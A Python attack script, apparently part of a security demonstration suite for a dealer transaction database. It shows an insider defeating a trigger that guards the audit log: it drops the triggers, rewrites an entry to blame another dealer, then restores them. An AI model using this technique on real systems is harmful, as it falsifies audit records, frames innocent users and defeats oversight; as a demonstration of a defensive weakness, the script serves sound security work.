"""ATTACK 4 - edit the audit log to hide who did something.

Step 1: try a normal UPDATE. The trigger refuses.
Step 2: drop the trigger (the insider owns the file, so they can), edit the
        row to blame another dealer, and put the trigger back.

Usage: python attacks/tamper_audit_log.py [--seq N]
"""
from __future__ import annotations

import argparse
import sqlite3

from _common import drop_triggers, open_as_insider, restore_triggers, say


def run(db_path=None, seq: int | None = None, new_actor: str = "dealer3") -> dict:
    connection = open_as_insider(db_path)
    if seq is None:   # prefer the newest "transaction created" entry
        row = connection.execute(
            "SELECT * FROM audit_log ORDER BY (action = 'TRANSACTION_CREATED') DESC, seq DESC LIMIT 1").fetchone()
    else:
        row = connection.execute("SELECT * FROM audit_log WHERE seq = ?", (seq,)).fetchone()
    if row is None:
        raise SystemExit("The audit log is empty.")
    if row["actor_username"] == new_actor:
        new_actor = "dealer2"

    say(f"Target: audit entry #{row['seq']} ({row['action']} by {row['actor_username']}).")
    blocked_message = ""
    try:
        connection.execute("UPDATE audit_log SET actor_username = ? WHERE seq = ?", (new_actor, row["seq"]))
    except sqlite3.DatabaseError as error:
        blocked_message = str(error)
        connection.rollback()
        say(f"Plain UPDATE refused by the database: \"{error}\"")

    say("Dropping the triggers, then editing the row...")
    triggers = drop_triggers(connection, "audit_log")
    connection.execute("UPDATE audit_log SET actor_username = ? WHERE seq = ?", (new_actor, row["seq"]))
    restore_triggers(connection, triggers)
    connection.commit()
    connection.close()
    say(f"Entry #{row['seq']} now says the actor was '{new_actor}'. Triggers restored.")
    return {"seq": row["seq"], "before": row["actor_username"], "after": new_actor,
            "trigger_blocked_first_try": bool(blocked_message), "trigger_message": blocked_message}


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--seq", type=int)
    run(seq=parser.parse_args().seq)
